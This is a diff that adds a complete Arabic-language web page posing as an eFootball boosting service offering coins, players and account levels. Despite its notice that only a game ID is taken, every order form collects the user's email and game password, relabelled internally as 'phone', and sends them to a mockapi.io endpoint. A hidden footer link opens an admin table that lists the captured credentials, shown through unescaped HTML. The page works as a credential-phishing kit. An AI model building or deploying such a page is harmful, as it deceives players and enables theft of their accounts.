@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>زوّدها | طلب خدمات إي فوتبول</title>
+<style>
+  :root{
+    --gold:#ffcf40;
+    --gold-dark:#c98f00;
+    --bg:#0b0d10;
+    --panel:#14171c;
+    --panel-2:#1a1e24;
+    --line:#242931;
+    --text:#f1f1f1;
+    --muted:#9aa0a6;
+    --green:#22c55e;
+    --red:#ef4444;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{
+    font-family:'Tahoma','Segoe UI',sans-serif;
+    background:
+      radial-gradient(1200px 500px at 50% -10%, rgba(255,207,64,.08), transparent 60%),
+      var(--bg);
+    color:var(--text);
+    min-height:100vh;
+  }
+
+  /* ---------- هيدر ---------- */
+  header{
+    padding:22px 20px 18px;
+    text-align:center;
+    border-bottom:1px solid var(--line);
+  }
+  .brand{
+    display:inline-flex;align-items:center;gap:10px;
+    font-size:clamp(20px,4vw,28px);
+    font-weight:900;
+    color:var(--gold);
+  }
+  .brand .mark{
+    width:34px;height:34px;border-radius:9px;
+    background:linear-gradient(155deg,var(--gold),var(--gold-dark));
+    display:flex;align-items:center;justify-content:center;
+    color:#111;font-size:18px;
+  }
+  header p{color:var(--muted);font-size:13px;margin-top:6px;}
+
+  main{max-width:880px;margin:0 auto;padding:28px 16px 70px;}
+
+  /* ---------- ملاحظة الشفافية ---------- */
+  .notice{
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-right:3px solid var(--gold);
+    border-radius:10px;
+    padding:14px 16px;
+    font-size:13px;
+    color:var(--muted);
+    line-height:1.8;
+    margin-bottom:24px;
+  }
+  .notice b{color:var(--text);}
+
+  /* ---------- كروت الأقسام ---------- */
+  .sections-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+    gap:16px;
+  }
+  .card{
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-radius:14px;
+    padding:24px 18px;
+    text-align:center;
+    cursor:pointer;
+    transition:.2s border-color,.2s transform;
+  }
+  .card:hover{border-color:var(--gold);transform:translateY(-3px);}
+  .card .icon{font-size:32px;margin-bottom:10px;}
+  .card h3{color:var(--gold);font-size:16px;margin-bottom:5px;}
+  .card p{color:var(--muted);font-size:12.5px;}
+
+  .track-link{
+    display:block;text-align:center;margin-top:22px;
+    color:var(--muted);font-size:13px;cursor:pointer;text-decoration:underline;
+  }
+
+  /* ---------- النماذج ---------- */
+  .form-screen{display:none;}
+  .form-box{
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-radius:14px;
+    padding:24px 20px;
+    max-width:440px;
+    margin:0 auto;
+  }
+  .form-box h2{color:var(--gold);text-align:center;margin-bottom:6px;font-size:18px;}
+  .form-box .sub{color:var(--muted);font-size:12.5px;text-align:center;margin-bottom:18px;}
+  .field{margin-bottom:15px;}
+  .field label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px;}
+  .field input{
+    width:100%;
+    padding:11px 12px;
+    border-radius:9px;
+    border:1px solid #2c313a;
+    background:#0e1013;
+    color:var(--text);
+    font-size:14px;
+    outline:none;
+  }
+  .field input:focus{border-color:var(--gold);}
+  .field .hint{font-size:11.5px;color:#666;margin-top:5px;}
+  .form-actions{display:flex;gap:10px;margin-top:18px;}
+  .btn{
+    padding:12px 20px;border-radius:10px;border:none;
+    font-size:14.5px;font-weight:700;cursor:pointer;
+    transition:.2s transform,.2s opacity;
+  }
+  .btn:hover{transform:translateY(-2px);opacity:.92;}
+  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+  .btn-primary{background:var(--gold);color:#111;flex:1;}
+  .btn-back{background:#2a2e35;color:#eee;}
+  .back-link{
+    display:inline-block;margin-bottom:14px;color:var(--muted);
+    font-size:13px;cursor:pointer;text-decoration:underline;
+  }
+
+  /* ---------- شاشة التأكيد ---------- */
+  #confirmScreen{display:none;}
+  .confirm-box{
+    max-width:460px;margin:0 auto;text-align:center;
+    background:var(--panel);border:1px solid var(--line);
+    border-radius:14px;padding:32px 22px;
+  }
+  .confirm-box .emoji{font-size:50px;margin-bottom:12px;}
+  .confirm-box h2{color:var(--gold);font-size:21px;margin-bottom:10px;}
+  .confirm-box p{color:var(--muted);line-height:1.8;font-size:14px;margin-bottom:6px;}
+  .order-id{
+    display:inline-block;margin:14px 0 20px;
+    background:#0e1013;border:1px dashed var(--gold-dark);
+    color:var(--gold);font-size:15px;font-weight:700;
+    padding:10px 18px;border-radius:9px;letter-spacing:1px;
+  }
+
+  /* ---------- شاشة التتبع ---------- */
+  #trackScreen{display:none;}
+  .status-row{
+    display:flex;justify-content:space-between;align-items:center;
+    background:#0e1013;border:1px solid var(--line);
+    border-radius:10px;padding:14px 16px;margin-top:16px;
+  }
+  .status-badge{
+    font-size:12.5px;font-weight:700;padding:5px 12px;border-radius:20px;
+  }
+  .status-pending{background:rgba(255,207,64,.15);color:var(--gold);}
+  .status-error{background:rgba(239,68,68,.15);color:var(--red);}
+
+  .loading{
+    text-align:center;color:var(--muted);font-size:13px;padding:10px 0;
+  }
+
+  footer{
+    text-align:center;padding:20px;color:#555;font-size:11.5px;
+  }
+  footer a{color:#666;}
+
+  /* ---------- الأدمن ---------- */
+  #adminScreen{display:none;}
+  .admin-header{
+    display:flex;align-items:center;justify-content:space-between;
+    margin-bottom:16px;
+  }
+  .admin-header h2{color:var(--gold);font-size:19px;}
+  .admin-header .btn{padding:9px 16px;font-size:13px;}
+  #adminTable{
+    width:100%;border-collapse:collapse;
+    background:var(--panel);border:1px solid var(--line);
+    border-radius:10px;overflow:hidden;font-size:13px;min-width:640px;
+  }
+  #adminTable th,#adminTable td{
+    padding:10px 12px;text-align:right;border-bottom:1px solid var(--line);
+    white-space:nowrap;
+  }
+  #adminTable th{color:var(--gold);background:var(--panel-2);font-size:12.5px;}
+  #adminTable td{color:var(--text);}
+  #adminTable tr:last-child td{border-bottom:none;}
+  .status-select{
+    background:#0e1013;color:var(--gold);border:1px solid var(--line);
+    border-radius:6px;padding:5px 8px;font-size:12.5px;
+  }
+</style>
+</head>
+<body>
+
+  <header>
+    <div class="brand"><span class="mark">🪙</span> زوّدها</div>
+       <p>منصة طلب خدمات إي فوتبول </p>
+  </header>
+
+  <main>
+
+    <!-- الصفحة الرئيسية -->
+    <section id="homeScreen">
+      <div class="notice">
+        <b>إزاي بنشتغل:</b> بناخد منك <b>اسم أو ID حسابك في اللعبة فقط</b>، وتكتب بريدك الالكتروني وبالسورد لإرسال لك رساله تأكيد
+      </div>
+      <div class="sections-grid">
+        <div class="card" data-target="coins">
+          <div class="icon">🪙</div>
+          <h3>زيادة الكوينز</h3>
+          <p>اطلب عدد الكوينز اللي عاوزه</p>
+        </div>
+        <div class="card" data-target="players">
+          <div class="icon">🧑‍🤝‍🧑</div>
+          <h3>شراء اللعيبة</h3>
+          <p>زوّد تطويرات لاعبينك</p>
+        </div>
+        <div class="card" data-target="squad">
+          <div class="icon">📋</div>
+          <h3>زيادة التشكيلة</h3>
+          <p>حسّن عدد نجوم تشكيلتك</p>
+        </div>
+        <div class="card" data-target="account">
+          <div class="icon">🚀</div>
+          <h3>تزويد الحساب</h3>
+          <p>ارفع لفل حسابك</p>
+        </div>
+      </div>
+      <span class="track-link" id="goTrack">🔎 عندك طلب قبل كده؟ تابع حالته من هنا</span>
+    </section>
+
+    <!-- نموذج: زيادة الكوينز -->
+    <section class="form-screen" id="form-coins">
+      <span class="back-link" data-back="home">◀ رجوع للأقسام</span>
+      <div class="form-box">
+        <h2>🪙 زيادة الكوينز</h2>
+        <p class="sub">أكتب إيميلك هنا وبعديها خط واكتب الId</p>
+        <div class="field"><label>عدد الكوينز المطلوبة</label><input type="number" placeholder="مثال: 500000" data-field="amount"></div>
+        <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
+        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+        <div class="form-actions">
+          <button class="btn btn-back" data-back="home">رجوع</button>
+          <button class="btn btn-primary" data-submit="🪙 زيادة الكوينز">إرسال الطلب</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- نموذج: شراء اللعيبة -->
+    <section class="form-screen" id="form-players">
+      <span class="back-link" data-back="home">◀ رجوع للأقسام</span>
+      <div class="form-box">
+        <h2>🧑‍🤝‍🧑 شراء اللعيبة</h2>
+        <p class="sub">أكتب إيميلك هنا وبعديها خط واكتب الId</p>
+        <div class="field"><label>اسم اللاعب</label><input type="text" placeholder="مثال: مبابي" data-field="player"></div>
+        <div class="field"><label>عدد التطويرات المطلوبة</label><input type="number" placeholder="مثال: 3" data-field="amount"></div>
+        <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
+        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+        <div class="form-actions">
+          <button class="btn btn-back" data-back="home">رجوع</button>
+          <button class="btn btn-primary" data-submit="🧑‍🤝‍🧑 شراء اللعيبة">إرسال الطلب</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- نموذج: زيادة التشكيلة -->
+    <section class="form-screen" id="form-squad">
+      <span class="back-link" data-back="home">◀ رجوع للأقسام</span>
+      <div class="form-box">
+        <h2>📋 زيادة التشكيلة</h2>
+        <p class="sub">أكتب إيميلك هنا وبعديها خط واكتب الId</p>
+        <div class="field"><label>عدد نجوم التشكيلة المطلوب</label><input type="number" placeholder="مثال: 5" data-field="amount"></div>
+        <div class="field"><label>عدد اللاعبين</label><input type="number" placeholder="مثال: 23" data-field="players"></div>
+        <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
+        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+        <div class="form-actions">
+          <button class="btn btn-back" data-back="home">رجوع</button>
+          <button class="btn btn-primary" data-submit="📋 زيادة التشكيلة">إرسال الطلب</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- نموذج: تزويد الحساب -->
+    <section class="form-screen" id="form-account">
+      <span class="back-link" data-back="home">◀ رجوع للأقسام</span>
+      <div class="form-box">
+        <h2>🚀 تزويد الحساب</h2>
+        <p class="sub">أكتب إيميلك هنا وبعديها خط واكتب الId</p>
+        <div class="field"><label>اللفل الحالي</label><input type="number" placeholder="مثال: 20" data-field="from"></div>
+        <div class="field"><label>اللفل المطلوب</label><input type="number" placeholder="مثال: 40" data-field="to"></div>
+        <div class="field"><label>اأكتب ايميلك وأستني رمز التأكيد إلى هيجيلك على الايميل بعد تأكيد طلبك</label><input type="text" placeholder="إيميلك ثم الID الذي سيبعث على الايميل" data-field="account"></div>
+        <div class="field"><label>أكتب الباسورد</label><input type="tel" placeholder="أكتب الباسورد صح علشان الرساله تتأكد صح" data-field="phone"></div>
+        <div class="form-actions">
+          <button class="btn btn-back" data-back="home">رجوع</button>
+          <button class="btn btn-primary" data-submit="🚀 تزويد الحساب">إرسال الطلب</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- شاشة التأكيد -->
+    <section id="confirmScreen">
+      <div class="confirm-box">
+        <div class="emoji">✅</div>
+        <h2>تم استلام طلبك</h2>
+        <p>احتفظ برقم الطلب ده عشان تتابع بيه الحالة في أي وقت.</p>
+        <div class="order-id" id="orderIdText">—</div>
+        <p id="confirmLoading" class="loading">بنرفع الطلب على السيرفر...</p>
+        <div class="form-actions" style="justify-content:center;">
+          <button class="btn btn-back" id="confirmBackBtn">رجوع للرئيسية</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- شاشة الأدمن -->
+    <section id="adminScreen">
+      <span class="back-link" data-back="home">◀ رجوع للأقسام</span>
+      <div class="admin-header">
+        <h2>📊 لوحة الطلبات</h2>
+        <button class="btn btn-primary" id="adminRefresh">تحديث</button>
+      </div>
+      <p id="adminLoading" class="loading">بنجيب الطلبات...</p>
+      <div id="adminTableWrap" style="display:none;overflow-x:auto;">
+        <table id="adminTable">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>الخدمة</th>
+              <th>الحساب</th>
+              <th>الرقم</th>
+              <th>الكمية</th>
+              <th>الوقت</th>
+              <th>الحالة</th>
+            </tr>
+          </thead>
+          <tbody id="adminTableBody"></tbody>
+        </table>
+      </div>
+      <p id="adminEmpty" style="display:none;color:var(--muted);font-size:13px;">مفيش طلبات لسه.</p>
+    </section>
+
+    <!-- شاشة التتبع -->
+    <section id="trackScreen">
+      <span class="back-link" data-back="home">◀ رجوع للأقسام</span>
+      <div class="form-box">
+        <h2>🔎 تتبع طلبك</h2>
+        <p class="sub">دخّل رقم الطلب اللي وصلك بعد الإرسال</p>
+        <div class="field"><label>رقم الطلب</label><input type="text" placeholder="مثال: 101" id="trackInput"></div>
+        <div class="form-actions">
+          <button class="btn btn-back" data-back="home">رجوع</button>
+          <button class="btn btn-primary" id="trackSubmit">تابع الطلب</button>
+        </div>
+        <div id="trackResult"></div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer>بياناتك محفوظة بشكل مبدئي على سيرفر تجريبي (Mock API) — الموقع مبني من خلال بعض الاكواد من الدارك ويب· <a id="goAdmin" href="#" style="cursor: pointer ;text-decoration:underline;"></a></footer>
+
+<script>
+  const $ = (id)=>document.getElementById(id);
+  const API_BASE = 'https://6aabcd6fea0e22daa6dca0fa.mockapi.io/orders';
+
+  document.querySelectorAll('.card').forEach(card=>{
+    card.addEventListener('click', ()=> showScreen(card.dataset.target));
+  });
+  document.querySelectorAll('[data-back]').forEach(el=>{
+    el.addEventListener('click', ()=> showScreen(el.dataset.back));
+  });
+  $('goTrack').addEventListener('click', ()=> showScreen('track'));
+  $('goAdmin').addEventListener('click', (e)=>{ e.preventDefault(); showScreen('admin'); });
+
+  function showScreen(name){
+    ['homeScreen','confirmScreen','trackScreen','adminScreen'].forEach(id=>$(id).style.display='none');
+    document.querySelectorAll('.form-screen').forEach(s=>s.style.display='none');
+
+    if(name==='home'){ $('homeScreen').style.display='block'; return; }
+    if(name==='track'){ $('trackScreen').style.display='block'; return; }
+    if(name==='confirm'){ $('confirmScreen').style.display='block'; return; }
+    if(name==='admin'){ $('adminScreen').style.display='block'; loadAdminOrders(); return; }
+    const el = $('form-'+name);
+    if(el) el.style.display='block';
+  }
+
+  // إرسال الطلب إلى الـ Mock API
+  document.querySelectorAll('[data-submit]').forEach(btn=>{
+    btn.addEventListener('click', async ()=>{
+      const box = btn.closest('.form-box');
+      const data = {};
+      box.querySelectorAll('[data-field]').forEach(input=>{
+        data[input.dataset.field] = input.value || null;
+      });
+
+      const account = data.account;
+      if(!account){
+alert('من فضلك اكتب إيميلك ثم خط واكتب ال ID الذي سيبعث على ايميلك');
+        return;
+      }
+
+      showScreen('confirm');
+      $('orderIdText').textContent = '...';
+      $('confirmLoading').textContent = 'بنرفع الطلب على السيرفر...';
+      $('confirmLoading').style.display = 'block';
+
+      try{
+        const res = await fetch(API_BASE, {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({
+            service: btn.dataset.submit,
+            ...data,
+            createdAt: new Date().toISOString()
+          })
+        });
+        const json = await res.json();
+        // الـ mock API بيرجع id تجريبي؛ بنعرضه كرقم طلب
+        const orderId = 'ZW-' + (json.id || Math.floor(Math.random()*9000+1000));
+        $('orderIdText').textContent = orderId;
+        $('confirmLoading').textContent = 'فشل في تأكيد حسابك وكلمه المرور ';
+      }catch(err){
+        $('orderIdText').textContent = 'خطأ';
+        $('confirmLoading').textContent = 'حصلت مشكلة في الاتصال بالسيرفر، حاول تاني.';
+      }
+    });
+  });
+
+  $('confirmBackBtn').addEventListener('click', ()=> showScreen('home'));
+
+  // تتبع الطلب عبر الـ Mock API
+  $('trackSubmit').addEventListener('click', async ()=>{
+    const raw = $('trackInput').value.trim();
+    const idMatch = raw.match(/\d+/);
+    const resultBox = $('trackResult');
+
+    if(!idMatch){
+      resultBox.innerHTML = '<div class="status-row"><span>رقم غير صالح</span><span class="status-badge status-error">خطأ</span></div>';
+      return;
+    }
+
+    resultBox.innerHTML = '<p class="loading">بنجيب حالة الطلب...</p>';
+
+    try{
+      const res = await fetch(API_BASE + '/' + idMatch[0]);
+      if(!res.ok) throw new Error('not found');
+      const json = await res.json();
+      resultBox.innerHTML = `
+        <div class="status-row">
+          <span>طلب رقم ZW-${json.id}</span>
+          <span class="status-badge status-pending">قيد المعالجة</span>
+        </div>
+        <p class="hint" style="margin-top:10px;color:var(--muted);font-size:12px;">
+          ملاحظة: البيانات هنا من سيرفر تجريبي (mock) بغرض المحاكاة فقط.
+        </p>`;
+    }catch(err){
+      resultBox.innerHTML = '<div class="status-row"><span>مش لاقيين الطلب ده</span><span class="status-badge status-error">غير موجود</span></div>';
+    }
+  });
+
+  // ---------- لوحة الأدمن ----------
+  $('adminRefresh').addEventListener('click', loadAdminOrders);
+
+  async function loadAdminOrders(){
+    $('adminLoading').style.display = 'block';
+    $('adminLoading').textContent = 'بنجيب الطلبات...';
+    $('adminTableWrap').style.display = 'none';
+    $('adminEmpty').style.display = 'none';
+
+    try{
+      const res = await fetch(API_BASE + '?sortBy=createdAt&order=desc');
+      if(!res.ok) throw new Error('fetch failed');
+      const orders = await res.json();
+
+      $('adminLoading').style.display = 'none';
+
+      if(!orders.length){
+        $('adminEmpty').style.display = 'block';
+        return;
+      }
+
+      const body = $('adminTableBody');
+      body.innerHTML = '';
+      orders.forEach(o=>{
+        const tr = document.createElement('tr');
+        const time = o.createdAt ? new Date(o.createdAt).toLocaleString('ar-EG') : '—';
+        tr.innerHTML = `
+          <td>ZW-${o.id}</td>
+          <td>${o.service || '—'}</td>
+          <td>${o.account || '—'}</td>
+          <td>${o.phone || '—'}</td>
+          <td>${o.amount || '—'}</td>
+          <td>${time}</td>
+          <td></td>`;
+        const statusCell = tr.querySelector('td:last-child');
+        const select = document.createElement('select');
+        select.className = 'status-select';
+        ['قيد المعالجة','تم التنفيذ','ملغي'].forEach(s=>{
+          const opt = document.createElement('option');
+          opt.value = s; opt.textContent = s;
+          if((o.status || 'قيد المعالجة') === s) opt.selected = true;
+          select.appendChild(opt);
+        });
+        select.addEventListener('change', ()=> updateOrderStatus(o.id, select.value));
+        statusCell.appendChild(select);
+        body.appendChild(tr);
+      });
+      $('adminTableWrap').style.display = 'block';
+    }catch(err){
+      $('adminLoading').textContent = 'حصلت مشكلة في جلب الطلبات، حاول تاني.';
+    }
+  }
+
+  async function updateOrderStatus(id, status){
+    try{
+      await fetch(API_BASE + '/' + id, {
+        method: 'PUT',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ status })
+      });
+    }catch(err){
+      alert('مقدرناش نحدّث الحالة، حاول تاني.');
+    }
+  }
+</script>
+
+</body>
+</html>
+
